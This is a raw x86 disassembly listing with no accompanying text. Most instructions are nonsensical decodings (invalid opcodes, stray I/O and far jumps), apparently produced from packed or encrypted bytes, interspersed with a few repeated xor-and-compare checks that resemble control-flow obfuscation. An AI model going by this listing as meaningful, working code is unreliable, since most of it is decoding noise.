  40b564:	mov    al,0xa9
  40b566:	cmp    ebx,DWORD PTR [ecx]
  40b568:	fmul   st,st(1)
  40b56a:	popf   
  40b56b:	and    eax,0x77149eec
  40b570:	sub    al,0x1a
  40b572:	clc    
  40b573:	xchg   esp,eax
  40b574:	es mov ecx,0x392031a4
  40b57a:	inc    esi
  40b57b:	xchg   esp,eax
  40b57c:	xchg   ah,al
  40b57e:	sub    esi,DWORD PTR [ebx+0x67]
  40b581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b582:	xchg   edx,eax
  40b583:	js     0x40b514
  40b585:	xor    ebp,DWORD PTR [edx-0x8]
  40b588:	sbb    eax,0xe4e1d3d8
  40b58d:	mov    ?,bp
  40b590:	mov    edi,0xcc2ed951
  40b595:	push   cs
  40b596:	or     bh,BYTE PTR [edi+0x216120bd]
  40b59c:	mov    al,0xa2
  40b59e:	xor    eax,DWORD PTR [ebx-0x3cfca17a]
  40b5a4:	adc    DWORD PTR [ecx+0x5131faa9],esp
  40b5aa:	pop    edi
  40b5ab:	mov    dh,0x84
  40b5ad:	lock out dx,eax
  40b5af:	(bad)  
  40b5b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5b2:	mov    ecx,?
  40b5b4:	das    
  40b5b5:	jae    0x40b5e4
  40b5b7:	in     al,0x2d
  40b5b9:	xchg   esi,eax
  40b5ba:	jne    0x40b56b
  40b5bc:	int3   
  40b5bd:	cld    
  40b5be:	xlat   BYTE PTR ds:[ebx]
  40b5bf:	sbb    bh,ch
  40b5c1:	jmp    0xd5130d9a
  40b5c6:	push   0xffffff8a
  40b5c8:	out    0xc3,al
  40b5ca:	mov    bl,0x83
  40b5cc:	jp     0x40b5a2
  40b5ce:	ins    BYTE PTR es:[edi],dx
  40b5cf:	(bad)  [esi+0x27]
  40b5d2:	dec    esi
  40b5d3:	out    dx,eax
  40b5d4:	add    bh,bh
  40b5d6:	icebp  
  40b5d7:	and    esi,DWORD PTR [eax-0x52]
  40b5da:	test   edx,ebp
  40b5dc:	push   ebx
  40b5dd:	add    eax,0xd6def33b
  40b5e2:	push   edi
  40b5e3:	scas   al,BYTE PTR es:[edi]
  40b5e4:	add    al,BYTE PTR [eax-0x4ac1cc80]
  40b5ea:	and    al,0x82
  40b5ec:	ror    BYTE PTR [edx+edi*2-0x2cfb7d66],0x2f
  40b5f4:	test   BYTE PTR [ecx-0x25868d8a],bh
  40b5fa:	jns    0x40b611
  40b5fc:	dec    edi
  40b5fd:	fcom   DWORD PTR [ebx-0x372ec3d7]
  40b603:	(bad)  
  40b604:	jmp    0x40b65c
  40b606:	xor    ch,bh
  40b608:	cdq    
  40b609:	jp     0x40b5fe
  40b60b:	fild   DWORD PTR [esi+0x204230c1]
  40b611:	jmp    0x40b5fa
  40b613:	sbb    bh,0xc4
  40b616:	jne    0x40b631
  40b618:	jnp    0x40b5d2
  40b61a:	sbb    bh,BYTE PTR [esi-0x5b0fa785]
  40b620:	xor    DWORD PTR [eax+0x21a8f8f7],ebp
  40b626:	imul   ecx,DWORD PTR [eax+0x6eb9df8f],0xd33bb4f2
  40b630:	inc    ebx
  40b631:	cdq    
  40b632:	aaa    
  40b633:	sub    BYTE PTR [edi-0x74],cl
  40b636:	(bad)  [edx+0xf]
  40b639:	nop
  40b63a:	js     0x40b5f9
  40b63c:	and    al,cl
  40b63e:	fdivr  QWORD PTR [eax]
  40b640:	cwde   
  40b641:	jne    0x40b5f9
  40b643:	jmp    0xdf631d6d
  40b648:	mov    bh,al
  40b64a:	in     eax,dx
  40b64b:	jb     0x40b6ab
  40b64d:	or     al,0x7b
  40b64f:	mov    esp,0x11035ae5
  40b654:	or     al,0xe7
  40b656:	cmp    BYTE PTR [eax-0x230947fa],dh
  40b65c:	cmp    edi,edi
  40b65e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b65f:	ss sbb eax,0xd665fb6d
  40b665:	xor    eax,0x72758eae
  40b66a:	das    
  40b66b:	sahf   
  40b66c:	push   eax
  40b66d:	dec    ebx
  40b66e:	dec    ecx
  40b66f:	pop    esp
  40b670:	gs and eax,0xdf50ae97
  40b676:	mov    al,0xab
  40b678:	jmp    0x40b6f7
  40b67a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b67b:	push   edx
  40b67c:	shr    BYTE PTR [ebp-0x59fa3d84],cl
  40b682:	push   esi
  40b683:	adc    bl,BYTE PTR [edi]
  40b685:	jle    0x40b704
  40b687:	mov    ecx,DWORD PTR [ecx]
  40b689:	and    al,0xba
  40b68b:	or     al,0x1e
  40b68d:	scas   al,BYTE PTR es:[edi]
  40b68e:	aas    
  40b68f:	ror    bl,cl
  40b691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b692:	mov    edi,0x5135cda4
  40b697:	in     eax,0xc
  40b699:	retf   
  40b69a:	cmp    ecx,DWORD PTR [esi]
  40b69c:	out    0x8c,al
  40b69e:	stos   DWORD PTR es:[edi],eax
  40b69f:	and    bh,BYTE PTR [ebp+0x49c30768]
  40b6a5:	push   ebx
  40b6a6:	js     0x40b698
  40b6a8:	add    eax,0xd925b1a3
  40b6ad:	mov    eax,ds:0x18382fb2
  40b6b2:	jge    0x40b6f2
  40b6b4:	fdivr  st(3),st
  40b6b6:	jmp    0x40b692
  40b6b8:	mov    ebp,0x80f3df52
  40b6bd:	mov    ebx,0x3d58f96a
  40b6c2:	test   dh,ch
  40b6c4:	imul   eax,DWORD PTR [ecx+0xacb9ba8],0xffffffd3
  40b6cb:	nop
  40b6cc:	mov    eax,ds:0x1100ede0
  40b6d1:	inc    ebp
  40b6d2:	push   0x57
  40b6d4:	and    al,0x80
  40b6d6:	mov    eax,0x87927f76
  40b6db:	cld    
  40b6dc:	shr    al,cl
  40b6de:	mov    ebx,0xd57fbe57
  40b6e3:	jle    0x40b6e8
  40b6e5:	add    DWORD PTR [ebp+0x32],edx
  40b6e8:	sahf   
  40b6e9:	retf   
  40b6ea:	sbb    al,0xf4
  40b6ec:	xor    eax,0x9f6b6656
  40b6f1:	mov    dh,0x4c
  40b6f3:	fld    TBYTE PTR [esi]
  40b6f5:	sbb    al,0x91
  40b6f7:	jmp    0x9d407c35
  40b6fc:	mov    ebp,DWORD PTR [ebp+0x22]
  40b6ff:	mov    ebp,0xeec5c1f1
  40b704:	jmp    0x40b702
  40b706:	jmp    0xd5af0187
  40b70b:	cmp    al,0x28
  40b70d:	pop    ecx
  40b70e:	outs   dx,BYTE PTR ds:[esi]
  40b70f:	push   esi
  40b710:	pop    edi
  40b711:	js     0x40b6b1
  40b713:	daa    
  40b714:	mov    bl,0x51
  40b716:	enter  0x573e,0xf7
  40b71a:	in     eax,dx
  40b71b:	ret    
  40b71c:	or     BYTE PTR [edi-0x19],0x5a
  40b720:	xchg   ecx,eax
  40b721:	test   DWORD PTR [ebx+eiz*4+0x10954978],eax
  40b728:	cmp    edx,esp
  40b72a:	cmp    esp,DWORD PTR [edx]
  40b72c:	(bad)  
  40b72d:	xchg   ebx,eax
  40b72e:	and    ch,ch
  40b730:	mov    bh,0x1
  40b732:	lods   eax,DWORD PTR ds:[esi]
  40b733:	hlt    
  40b734:	sahf   
  40b735:	and    ecx,DWORD PTR [edi+0x2c]
  40b738:	push   ebp
  40b739:	daa    
  40b73a:	xor    DWORD PTR [esi-0x21c78779],ebx
  40b740:	mov    ds,WORD PTR [esp+esi*8+0x1fac1463]
  40b747:	vpackssdw ymm0,ymm1,ymm7
  40b74b:	mov    bl,0x74
  40b74d:	push   ebx
  40b74e:	push   ebx
  40b74f:	xchg   edx,eax
  40b750:	scas   eax,DWORD PTR es:[edi]
  40b751:	add    BYTE PTR [edi+eax*1+0x1d],0x7f
  40b756:	clc    
  40b757:	gs jnp 0x40b759
  40b75a:	jne    0x40b72c
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	inc    esi
  40b78b:	dec    esi
  40b78c:	add    BYTE PTR [ebp+0x7e7efeb2],dh
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	mov    dl,0x12
  40b798:	lods   eax,DWORD PTR ds:[esi]
  40b799:	lock mov ds:0x92cd37b6,eax
  40b79f:	push   esp
  40b7a0:	std    
  40b7a1:	mov    ds:0x63bfc7fb,al
  40b7a6:	xchg   ebx,eax
  40b7a7:	xchg   esp,eax
  40b7a8:	dec    esp
  40b7a9:	mov    ecx,0x386ab1d3
  40b7ae:	jge    0x40b75c
  40b7b0:	icebp  
  40b7b1:	mov    al,0xb9
  40b7b3:	pop    ecx
  40b7b4:	push   esi
  40b7b5:	aaa    
  40b7b6:	je     0x40b7f4
  40b7b8:	or     cl,BYTE PTR [ebx]
  40b7ba:	test   al,0xee
  40b7bc:	outs   dx,BYTE PTR ds:[esi]
  40b7bd:	xor    al,0x8
  40b7bf:	pop    ss
  40b7c0:	bound  esp,QWORD PTR ds:0x4051ddf9
  40b7c6:	cmp    eax,0x7565e053
  40b7cb:	push   eax
  40b7cc:	cmp    al,0xe3
  40b7ce:	and    ah,bl
  40b7d0:	addr16 test al,0x40
  40b7d3:	test   eax,0x337c13f5
  40b7d8:	daa    
  40b7d9:	mov    eax,0xe865ce57
  40b7de:	sub    al,0xd7
  40b7e0:	adc    bh,BYTE PTR [ecx+0x627a695a]
  40b7e6:	cmp    ebx,eax
  40b7e8:	sbb    edx,DWORD PTR [edx+0x2156690d]
  40b7ee:	lods   eax,DWORD PTR ds:[esi]
  40b7ef:	retf   0x584d
  40b7f2:	pop    eax
  40b7f3:	mov    ebp,DWORD PTR [ecx-0x3347ded1]
  40b7f9:	aas    
  40b7fa:	sub    DWORD PTR [ebx],ecx
  40b7fc:	xchg   edi,eax
  40b7fd:	pop    edi
  40b7fe:	push   0x3a
  40b800:	mov    al,0x9a
  40b802:	pop    esp
  40b803:	xchg   ecx,eax
  40b804:	outs   dx,DWORD PTR ds:[esi]
  40b805:	in     al,dx
  40b806:	mov    ebx,0x5c2f387b
  40b80b:	jbe    0x40b7cc
  40b80d:	push   cs
  40b80e:	push   esi
  40b80f:	xchg   ebx,eax
  40b810:	inc    ebx
  40b811:	mov    esp,edx
  40b813:	loope  0x40b84b
  40b815:	and    bh,dl
  40b817:	in     eax,dx
  40b818:	mov    ebp,0x4395466c
  40b81d:	fild   WORD PTR [ebp+edx*4-0x16]
  40b821:	push   0x35
  40b823:	and    ah,BYTE PTR [ecx-0x4089a66e]
  40b829:	cli    
  40b82a:	sub    al,0x21
  40b82c:	pop    es
  40b82d:	dec    esi
  40b82e:	and    al,0xa4
  40b830:	test   al,0x5b
  40b832:	push   esi
  40b833:	add    DWORD PTR [esi+ebp*8],ebx
  40b836:	cli    
  40b837:	aas    
  40b838:	mul    BYTE PTR [edx+ebx*4]
  40b83b:	pop    eax
  40b83c:	outs   dx,DWORD PTR ds:[esi]
  40b83d:	stos   BYTE PTR es:[edi],al
  40b83e:	(bad)  
  40b83f:	aam    0xad
  40b841:	arpl   si,dx
  40b843:	sub    BYTE PTR ds:0x81ae22af,dl
  40b849:	mov    ch,0xab
  40b84b:	(bad)  
  40b84c:	scas   al,BYTE PTR es:[edi]
  40b84d:	xchg   edi,eax
  40b84f:	call   0x714f043f
  40b854:	mov    bl,0x1c
  40b856:	cmc    
  40b857:	pop    ebx
  40b858:	out    dx,al
  40b859:	(bad)  
  40b85a:	int3   
  40b85b:	loop   0x40b8b0
  40b85d:	fcmovbe st,st(0)
  40b85f:	pop    ebx
  40b860:	push   edx
  40b861:	popf   
  40b862:	or     eax,0x119da62f
  40b867:	fwait
  40b868:	pop    edx
  40b869:	test   eax,0xf94de5e0
  40b86e:	cmc    
  40b86f:	add    DWORD PTR [eax],esi
  40b871:	es add edi,eax
  40b874:	js     0x40b8a8
  40b876:	dec    eax
  40b877:	or     al,0xb4
  40b879:	mov    ds:0x50821124,eax
  40b87e:	fwait
  40b87f:	or     eax,0x2d85eb81
  40b884:	jmp    0x329a:0xfd99b2af
  40b88b:	mov    ebx,0xca1e43d0
  40b890:	retf   0xeb45
  40b893:	sbb    eax,0x1300330d
  40b898:	xchg   edx,eax
  40b899:	loope  0x40b88a
  40b89b:	sar    BYTE PTR [edi+0x217925bb],0xc4
  40b8a2:	(bad)  
  40b8a4:	sbb    al,0xa5
  40b8a6:	xchg   ebp,eax
  40b8a7:	retf   
  40b8a8:	sti    
  40b8a9:	bound  eax,QWORD PTR [eax+0x2a]
  40b8ac:	loope  0x40b863
  40b8ae:	lock jb 0x40b8d5
  40b8b1:	push   es
  40b8b2:	dec    edx
  40b8b3:	cld    
  40b8b4:	aam    0xb9
  40b8b6:	fisttp WORD PTR [edi-0x15270bb9]
  40b8bc:	fnstcw WORD PTR [ebx-0x40]
  40b8bf:	mov    edx,0xa46f8e7f
  40b8c4:	mov    BYTE PTR [ecx-0x4],al
  40b8c7:	in     eax,dx
  40b8c8:	mov    ds:0x70f0b2f9,al
  40b8cd:	icebp  
  40b8ce:	gs jbe 0x40b8b9
  40b8d1:	test   BYTE PTR [ecx+0x51],ch
  40b8d4:	clc    
  40b8d5:	xchg   DWORD PTR [edx],esi
  40b8d7:	jge    0x40b85e
  40b8d9:	add    DWORD PTR [edi-0x75dc0249],eax
  40b8df:	(bad)
  40b8e3:	ret    0xcfbb
  40b8e6:	jns    0x40b936
  40b8e8:	mov    BYTE PTR [ebp-0x15],bl
  40b8eb:	lods   eax,DWORD PTR ds:[esi]
  40b8ec:	sbb    esp,DWORD PTR [ebx-0x44578251]
  40b8f2:	clc    
  40b8f3:	xchg   ebx,eax
  40b8f4:	or     eax,0x373b61ca
  40b8f9:	mov    bh,0xa0
  40b8fb:	mov    ebx,0x1229e9aa
  40b900:	fs aas 
  40b902:	pop    ecx
  40b903:	cmp    edi,edx
  40b905:	hlt    
  40b906:	enter  0xd2e8,0x78
  40b90a:	gs cwde 
  40b90c:	lods   al,BYTE PTR ds:[esi]
  40b90d:	inc    ebp
  40b90e:	mov    esi,0x47e6b621
  40b913:	cld    
  40b914:	shr    DWORD PTR [ebp-0x2d],cl
  40b917:	enter  0xa72a,0x98
  40b91b:	xchg   edx,eax
  40b91c:	stos   BYTE PTR es:[edi],al
  40b91d:	out    dx,eax
  40b91e:	lds    ebx,FWORD PTR [esp+ecx*8-0x1d]
  40b922:	mov    al,ds:0x7a740fc2
  40b927:	sub    al,0xad
  40b929:	inc    esi
  40b92a:	dec    eax
  40b92b:	inc    ecx
  40b92c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b92d:	call   0xb8234664
  40b932:	ret    
  40b933:	(bad)
  40b936:	pop    ds
  40b937:	push   0xffffffae
  40b939:	ret    0xf85c
  40b93c:	and    ah,BYTE PTR [ecx+0x24]
  40b93f:	fmul   st,st(0)
  40b941:	and    ebp,ecx
  40b943:	inc    edi
  40b944:	shr    DWORD PTR [esi-0x64],1
  40b947:	inc    eax
  40b948:	rol    BYTE PTR [ebp+0x19],cl
  40b94b:	inc    edi
  40b94c:	rol    DWORD PTR [ebp+0x7cb11b1b],cl
  40b952:	leave  
  40b953:	sub    ch,0x62
  40b956:	sub    eax,0x99b85104
  40b95b:	pop    esi
  40b95c:	sbb    BYTE PTR [esi],cl
  40b95e:	(bad)  
  40b95f:	int    0xc0
  40b961:	xchg   ebp,eax
  40b962:	and    DWORD PTR [ecx-0x6b82457d],0xffffffa7
  40b969:	cli    
  40b96a:	aas    
  40b96b:	(bad)
  40b970:	ja     0x40b987
  40b972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b973:	push   edi
  40b974:	es cdq 
  40b976:	leave  
  40b977:	xchg   BYTE PTR ds:0x214ff44d,cl
  40b97d:	inc    esp
  40b97e:	xchg   edi,eax
  40b97f:	dec    ecx
  40b980:	pusha  
  40b981:	sbb    ecx,DWORD PTR [edi-0x47b35d86]
  40b987:	sbb    cl,BYTE PTR [edi-0x632ea437]
  40b98d:	lods   al,BYTE PTR gs:[esi]
  40b98f:	mov    es,WORD PTR [edi-0x1c]
  40b992:	ins    DWORD PTR es:[edi],dx
  40b993:	sbb    DWORD PTR [ebx],0x10
  40b996:	sub    esi,0xd498e69d
  40b99c:	daa    
  40b99d:	rcr    ecx,cl
  40b99f:	(bad)  
  40b9a0:	push   ecx
  40b9a1:	xchg   BYTE PTR [eax],ah
  40b9a3:	out    0xcb,eax
  40b9a5:	fisttp DWORD PTR [eax-0x5b8a9a71]
  40b9ab:	adc    eax,0x6d348bee
  40b9b0:	stos   BYTE PTR es:[edi],al
  40b9b1:	enter  0xe1a6,0xe9
  40b9b5:	or     eax,DWORD PTR [eax-0x4b]
  40b9b8:	and    ah,bl
  40b9ba:	iret   
  40b9bb:	ds ret 
  40b9bd:	xor    DWORD PTR [esi+0x36],ebp
  40b9c0:	fisubr DWORD PTR [esi-0x5e17979]
  40b9c6:	mov    eax,ds:0xc539bad5
  40b9cb:	stos   DWORD PTR es:[edi],eax
  40b9cc:	xchg   edx,eax
  40b9cd:	cmc    
  40b9ce:	mov    ah,BYTE PTR [eax+eax*4]
  40b9d1:	cmp    al,0x4f
  40b9d3:	jmp    0xccfcf351
  40b9d8:	or     al,0x25
  40b9da:	sahf   
  40b9db:	lods   al,BYTE PTR ds:[esi]
  40b9dc:	mov    eax,DWORD PTR [ebp-0x20]
  40b9df:	inc    edi
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0xeffa808],eax
  40ba0f:	call   0x387e:0x7efd7c22
  40ba16:	jl     0x40ba96
  40ba18:	jle    0x40ba51
  40ba1a:	add    al,0xd4
  40ba1c:	xor    eax,DWORD PTR [eax]
  40ba1e:	push   ds
  40ba1f:	sub    esp,DWORD PTR [edi+0x15]
  40ba22:	and    DWORD PTR [ebx+0x3b619560],edi
  40ba28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba29:	xchg   ebp,eax
  40ba2a:	mov    bh,0x21
  40ba2c:	mov    esp,0xdb2033c8
  40ba31:	scas   al,BYTE PTR es:[edi]
  40ba32:	cmc    
  40ba33:	jge    0x40b9c3
  40ba35:	lds    ebx,FWORD PTR [ebp-0x37]
  40ba38:	cli    
  40ba39:	mov    dl,0xc8
  40ba3b:	lahf   
  40ba3c:	cld    
  40ba3d:	dec    ch
  40ba3f:	pop    ecx
  40ba40:	jle    0x40ba4b
  40ba42:	jns    0x40ba0c
  40ba44:	sub    al,0xe0
  40ba46:	sub    eax,0xcd70062
  40ba4b:	ds popa 
  40ba4d:	aad    0x1b
  40ba4f:	inc    eax
  40ba50:	inc    esp
  40ba51:	xchg   esp,eax
  40ba52:	cmc    
  40ba53:	mov    al,ds:0x8c9d67ea
  40ba58:	dec    edi
  40ba59:	in     eax,0x3b
  40ba5b:	shr    DWORD PTR [ebx-0xcf3ef11],0xfe
  40ba62:	mov    edi,0x25838f5b
  40ba67:	pop    ss
  40ba68:	ret    0x6535
  40ba6b:	xchg   esi,eax
  40ba6c:	mov    BYTE PTR ds:0x84c1523c,bh
  40ba72:	mov    eax,0xd5afd078
  40ba77:	lods   eax,DWORD PTR ds:[esi]
  40ba78:	mov    bl,0xf3
  40ba7a:	sbb    al,0x8d
  40ba7c:	adc    BYTE PTR [esi+0x12],al
  40ba7f:	push   ds
  40ba80:	mov    dl,0xbd
  40ba82:	sbb    al,0xcf
  40ba84:	jmp    0xf64f4488
  40ba89:	out    dx,eax
  40ba8a:	loopne 0x40bab3
  40ba8c:	add    BYTE PTR [eax-0x71d8cdd7],ch
  40ba92:	dec    edx
  40ba93:	fmul   QWORD PTR [ebx]
  40ba95:	lahf   
  40ba96:	(bad)  
  40ba98:	pop    eax
  40ba99:	lods   al,BYTE PTR gs:[esi]
  40ba9b:	xor    ebp,DWORD PTR [edx+0x63]
  40ba9e:	xor    bh,BYTE PTR [eax+0xe5d67d]
  40baa4:	xchg   ecx,eax
  40baa5:	mov    edi,0xf4a7bd46
  40baaa:	inc    esi
  40baab:	mov    esi,?
  40baad:	pop    eax
  40baae:	sub    BYTE PTR [ebp-0x3a],ah
  40bab1:	int    0x7
  40bab3:	call   0xb3c9c037
  40bab8:	mov    al,ds:0x4438bf20
  40babd:	icebp  
  40babe:	mov    ecx,0x9cf56baf
  40bac3:	dec    edi
  40bac4:	xor    edx,DWORD PTR [esi+0x20]
  40bac7:	dec    ecx
  40bac8:	xor    BYTE PTR [esi-0x9],cl
  40bacb:	push   esp
  40bacc:	add    al,0x4f
  40bace:	fbld   TBYTE PTR [ecx+0x568d2679]
  40bad4:	mov    edi,0x56b0f363
  40bad9:	xor    ch,bh
  40badb:	dec    eax
  40badc:	mov    bl,0xd4
  40bade:	rol    DWORD PTR [esi+ebx*8+0x7],0x6f
  40bae3:	icebp  
  40bae4:	clc    
  40bae5:	popf   
  40bae6:	xchg   DWORD PTR [ebx-0x6b],ebp
  40bae9:	aas    
  40baea:	adc    eax,0x6c0da053
  40baef:	dec    bl
  40baf1:	rcl    BYTE PTR [eax],1
  40baf3:	repz and eax,0x27863bba
  40baf9:	or     DWORD PTR [edx+ecx*1+0x4bf889f6],eax
  40bb00:	pusha  
  40bb01:	(bad)  
  40bb02:	mov    esp,0x937ca6b0
  40bb07:	ret    0x2c98
  40bb0a:	repnz xchg edx,eax
  40bb0c:	jmp    0x41f2:0xa2f1960c
  40bb13:	repz sub al,0x47
  40bb16:	jl     0x40bb02
  40bb18:	push   cs
  40bb19:	inc    ebp
  40bb1a:	jl     0x40bb77
  40bb1c:	or     al,0x99
  40bb1e:	ret    0x7a26
  40bb21:	fsub   QWORD PTR [ebx-0x3fc0078]
  40bb27:	in     eax,0x18
  40bb29:	sub    cl,0x6
  40bb2c:	adc    eax,0x40f5779f
  40bb31:	sbb    eax,0x7f40bf14
  40bb36:	sar    DWORD PTR [esi-0x143ef35b],cl
  40bb3c:	int3   
  40bb3d:	dec    ecx
  40bb3e:	cmc    
  40bb3f:	sar    BYTE PTR [eax+edi*1+0x2cf83bea],cl
  40bb46:	sub    ah,BYTE PTR [ebp+0x6e]
  40bb49:	inc    ecx
  40bb4a:	cdq    
  40bb4b:	lea    ebp,[ecx]
  40bb4d:	adc    DWORD PTR [ebx+ebp*1-0x3fa78de4],ebx
  40bb54:	xor    DWORD PTR ds:0xad116fdc,ebp
  40bb5a:	aaa    
  40bb5b:	ret    0x4631
  40bb5e:	push   ecx
  40bb5f:	(bad)  
  40bb60:	dec    ecx
  40bb61:	pop    ebx
  40bb62:	ret    0x49c4
  40bb65:	adc    DWORD PTR [ecx+esi*8+0x7],ecx
  40bb69:	in     eax,dx
  40bb6a:	mov    al,0x26
  40bb6c:	push   edx
  40bb6d:	mov    ds,WORD PTR [edx]
  40bb6f:	mov    ah,0xb8
  40bb71:	mov    gs,WORD PTR [esi]
  40bb73:	adc    esi,DWORD PTR [ebx]
  40bb75:	push   eax
  40bb76:	scas   eax,DWORD PTR es:[edi]
  40bb77:	mov    ah,bh
  40bb79:	fst    st(6)
  40bb7b:	dec    esi
  40bb7c:	pop    ds
  40bb7d:	pop    ebp
  40bb7e:	mov    ds:0xe55f846d,al
  40bb83:	xor    DWORD PTR [edi],edx
  40bb85:	pop    edi
  40bb86:	cmc    
  40bb87:	jmp    0x40bb6a
  40bb89:	test   DWORD PTR [edi-0x2f],eax
  40bb8c:	js     0x40bb4c
  40bb8e:	inc    ebp
  40bb8f:	pop    es
  40bb90:	ja     0x40bc00
  40bb92:	sub    al,0xc1
  40bb94:	mov    al,0xaf
  40bb96:	ins    BYTE PTR es:[edi],dx
  40bb97:	mov    al,0xb6
  40bb99:	push   0xffffffdb
  40bb9b:	clc    
  40bb9c:	arpl   WORD PTR [ebp+0x3d75518a],bx
  40bba2:	dec    ebp
  40bba3:	mov    WORD PTR [edi+0x23c2a5e6],ds
  40bba9:	push   eax
  40bbaa:	adc    DWORD PTR [ebp-0x4f],edi
  40bbad:	mov    DWORD PTR [eax+0x1b],0xb9229dea
  40bbb4:	dec    BYTE PTR [ecx-0x20]
  40bbb7:	jns    0x40bbcd
  40bbb9:	mov    esi,0x4d0277c3
  40bbbe:	int    0x38
  40bbc0:	call   0x30927813
  40bbc5:	out    0x4d,al
  40bbc7:	mov    fs,WORD PTR [esi-0x261df0d4]
  40bbcd:	adc    al,0x30
  40bbcf:	hlt    
  40bbd0:	xchg   eax,esi
  40bbd2:	pop    ebp
  40bbd3:	dec    edx
  40bbd4:	mov    BYTE PTR [esi],dl
  40bbd6:	xchg   ebx,eax
  40bbd7:	in     eax,0x34
  40bbd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbda:	push   ebp
  40bbdb:	xchg   esi,eax
  40bbdc:	in     eax,dx
  40bbdd:	loope  0x40bbec
  40bbdf:	mov    edi,0xc7c624e0
  40bbe4:	ret    0xb8f4
  40bbe7:	(bad)  
  40bbe8:	add    ebp,DWORD PTR [esi]
  40bbea:	mov    edx,0xa62d85fb
  40bbef:	aaa    
  40bbf0:	pop    ds
  40bbf1:	aas    
  40bbf2:	adc    al,0x86
  40bbf4:	test   eax,0xfac1dcf4
  40bbf9:	fisub  WORD PTR [ebp-0x71]
  40bbfc:	xchg   ebx,eax
  40bbfd:	sub    eax,DWORD PTR [eax+0x7d]
  40bc00:	in     eax,dx
  40bc01:	iret   
  40bc02:	shr    DWORD PTR [edi],1
  40bc04:	xchg   edx,eax
  40bc05:	xchg   ecx,eax
  40bc06:	push   ds
  40bc07:	mov    ebx,0xcc3f44a2
  40bc0c:	push   ss
  40bc0d:	out    0x25,al
  40bc0f:	pop    eax
  40bc10:	push   esp
  40bc11:	pop    ebx
  40bc12:	push   esp
  40bc13:	lds    ebx,FWORD PTR [edi+0x50]
  40bc16:	mov    cl,0x20
  40bc18:	mov    DWORD PTR [ecx],ebp
  40bc1a:	popa   
  40bc1b:	shl    DWORD PTR [ecx-0x75c2503d],1
  40bc21:	jmp    0x40bc2c
  40bc23:	sub    eax,0x910c101a
  40bc28:	leave  
  40bc29:	out    0x31,al
  40bc2b:	jmp    0xfdde:0x23e71fb2
  40bc32:	cmp    ah,BYTE PTR [ecx]
  40bc34:	daa    
  40bc35:	cs xor eax,0x4952cc1b
  40bc3b:	adc    DWORD PTR [edi+edx*1],0x23ccb0bb
  40bc42:	mov    dh,0x4
  40bc44:	daa    
  40bc45:	ds icebp 
  40bc47:	shl    DWORD PTR [eax+edx*2-0x3b4fd324],0x35
  40bc4f:	fdiv   QWORD PTR [ebp+0x7c]
  40bc52:	test   BYTE PTR [ecx-0x3587015],bh
  40bc58:	sub    al,bh
  40bc5a:	arpl   WORD PTR [edi+0xfcd85cb],ax
  40bc60:	mov    bh,0x4
  40bc62:	js     0x40bbef
  40bc64:	dec    ebp
  40bc65:	in     al,dx
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	int3   
  40bc96:	aam    0x4a
  40bc98:	adc    al,dh
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	popf   
  40bca2:	pusha  
  40bca3:	jg     0x40bd1a
  40bca5:	cmp    BYTE PTR [ebp-0x39d8d3ee],ch
  40bcab:	mov    BYTE PTR [edx+esi*4+0x17],al
  40bcaf:	rcl    BYTE PTR [eax+0x1a],0x30
  40bcb3:	mov    cl,0x8d
  40bcb5:	pop    edx
  40bcb6:	scas   eax,DWORD PTR es:[edi]
  40bcb7:	add    BYTE PTR ds:0x4c21c84a,0x8b
  40bcbe:	jno    0x40bcc3
  40bcc0:	dec    eax
  40bcc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcc2:	fsubp  st(6),st
  40bcc4:	sar    cl,cl
  40bcc6:	cmp    eax,0x260d54d4
  40bccb:	xchg   edx,eax
  40bccc:	adc    bh,BYTE PTR [edi]
  40bcce:	pusha  
  40bccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcd0:	dec    esp
  40bcd1:	mov    ecx,0x761ba229
  40bcd6:	sub    BYTE PTR ds:0xdabfebf3,0x67
  40bcdd:	jle    0x40bce5
